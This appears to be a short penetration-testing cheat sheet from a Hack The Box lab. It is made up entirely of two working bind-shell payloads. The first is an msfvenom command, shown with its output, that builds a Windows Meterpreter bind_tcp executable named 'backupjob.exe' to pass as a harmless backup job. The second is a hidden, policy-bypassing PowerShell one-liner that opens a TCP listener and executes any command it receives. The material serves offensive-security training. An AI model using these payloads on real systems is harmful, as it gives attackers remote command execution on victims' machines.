
---
### Meterpreter
```bash
hcx05@htb[/htb]$ msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443 
#LPORT: Target's port
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload 
[-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload 
Payload size: 499 bytes 
Final size of exe file: 7168 bytes 
Saved as: backupjob.exe
```

### Powershell
```bash
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```